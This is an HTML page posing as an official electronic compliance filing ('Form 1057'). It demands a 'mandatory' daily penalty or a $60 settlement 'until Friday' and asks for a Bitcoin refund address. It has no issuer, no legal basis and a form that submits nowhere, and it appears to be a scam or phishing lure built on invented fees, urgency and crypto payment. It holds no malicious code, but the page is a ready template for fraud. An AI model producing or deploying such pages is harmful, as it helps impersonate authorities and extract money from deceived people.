<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Final Compliance Filing | PB-142-WT1139</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="p-4 md:p-8 bg-gray-100">
    <div class="max-w-4xl mx-auto bg-white p-12 shadow-2xl border border-gray-300">
        <h1 class="text-2xl font-bold text-[#0b2e59]">ELECTRONIC FILING: FORM 1057</h1>
        <form id="filingForm" class="space-y-6 mt-8">
            <label class="block font-bold text-sm text-[#0b2e59]">Select Mandatory Fee Settlement:</label>
            <div class="space-y-3">
                <label class="block p-4 border border-gray-300 cursor-pointer hover:bg-gray-50">
                    <input type="radio" name="payment" value="daily" required> Pay $15.00 (Current Daily Penalty)
                </label>
                <label class="block p-4 border border-gray-300 cursor-pointer hover:bg-gray-50">
                    <input type="radio" name="payment" value="full" required> Pay $60.00 (Full Settlement of Late Fees until Friday)
                </label>
            </div>
            <div>
                <label class="block font-bold text-sm">Cryptographic Refund Address:</label>
                <input type="text" required class="w-full p-4 border border-gray-400 mt-2" placeholder="bc1q...">
            </div>
            <button type="submit" class="w-full bg-[#0b2e59] text-white py-4 font-bold uppercase hover:bg-blue-900">Submit Declaration</button>
        </form>
    </div>
</body>
</html>
